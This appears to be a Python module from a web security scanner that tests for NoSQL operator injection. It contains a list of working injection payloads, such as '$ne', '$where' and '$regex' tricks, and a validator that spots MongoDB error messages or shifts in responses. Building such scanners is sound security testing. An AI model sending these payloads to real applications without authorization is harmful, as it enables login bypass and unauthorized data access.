"""Generic NoSQL (operator) injection."""

from __future__ import annotations

import re

from penpine.attack.generator import PayloadGenerator
from penpine.attack.models import Confidence, Finding, Payload, TestCase
from penpine.attack.module import AttackModule
from penpine.attack.modules._common import body_text, search_signatures
from penpine.attack.types import AttackType
from penpine.attack.validator import Validator

NOSQLI_PAYLOADS = [
    "[$ne]=",
    "[$gt]=",
    '{"$ne":null}',
    '{"$gt":""}',
    "';return true;var x='",
    "' || '1'=='1",
    '", $where: "1==1',
    "[$regex]=.*",
]

NOSQLI_SIGNATURES = [
    re.compile(p, re.I)
    for p in [r"MongoError", r"E11000", r"\$where", r"\bBSON\b", r"MongoServerError", r"CastError"]
]


def _status(obj) -> int:
    return getattr(obj, "status_code", 0) or 0


def _blen(obj) -> int:
    return len(getattr(obj, "body", b"") or b"")


class NosqliGenerator(PayloadGenerator):
    def __init__(self, payloads=None):
        self._payloads = list(payloads) if payloads is not None else list(NOSQLI_PAYLOADS)

    def generate(self, point, request):
        for value in self._payloads:
            yield TestCase(
                point=point,
                payload=Payload(value, technique="nosqli"),
                attack_type=AttackType.NOSQLI,
            )


class NosqliValidator(Validator):
    def __init__(self, signatures=None):
        self._signatures = list(signatures) if signatures is not None else list(NOSQLI_SIGNATURES)

    def evaluate(self, test_case, response, baseline=None):
        match = search_signatures(body_text(response), self._signatures)
        if match is not None:
            if baseline is not None and search_signatures(body_text(baseline), self._signatures):
                return None
            return Finding(
                AttackType.NOSQLI,
                test_case.point,
                test_case.payload,
                Confidence.HIGH,
                f"NoSQL error signature: {match.group(0)[:80]}",
                request=test_case.request,
                response=response,
            )
        if baseline is not None:
            bs, rs = _status(baseline), _status(response)
            if rs >= 400 and rs // 100 != bs // 100:
                return Finding(
                    AttackType.NOSQLI,
                    test_case.point,
                    test_case.payload,
                    Confidence.MEDIUM,
                    f"status change {bs} -> {rs}",
                    request=test_case.request,
                    response=response,
                )
            bl, rl = _blen(baseline), _blen(response)
            if bl and (rl >= 3 * bl or rl * 3 <= bl):
                return Finding(
                    AttackType.NOSQLI,
                    test_case.point,
                    test_case.payload,
                    Confidence.MEDIUM,
                    f"response size {bl} -> {rl} bytes",
                    request=test_case.request,
                    response=response,
                )
        return None


NOSQLI_MODULE = AttackModule(
    "nosqli",
    NosqliGenerator(),
    NosqliValidator(),
    attack_type=AttackType.NOSQLI,
    applies_to=("param", "form", "json"),
    description="NoSQL operator injection",
)
